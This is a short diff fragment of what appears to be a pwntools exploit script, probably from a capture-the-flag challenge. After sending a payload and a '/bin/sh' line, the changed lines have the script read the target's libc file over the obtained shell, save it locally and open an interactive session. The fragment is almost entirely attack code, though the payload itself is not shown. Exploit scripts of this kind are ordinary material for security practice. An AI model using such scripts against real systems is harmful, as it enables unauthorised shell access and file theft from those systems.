@@ -29,10 +29,10 @@ io.sendline(payload)
 
 io.sendline('/bin/sh')
 
-#io.sendline('cat  /lib/x86_64-linux-gnu/libc.so.6; exit')
+io.sendline('cat   /lib/i386-linux-gnu/libc.so.6; exit')
 
-#buf = io.recvall()
-#open('libc','wb').write(buf)
-#print 'OK'
+buf = io.recvall()
+open('libc','wb').write(buf)
+print 'OK'
 
 io.interactive()
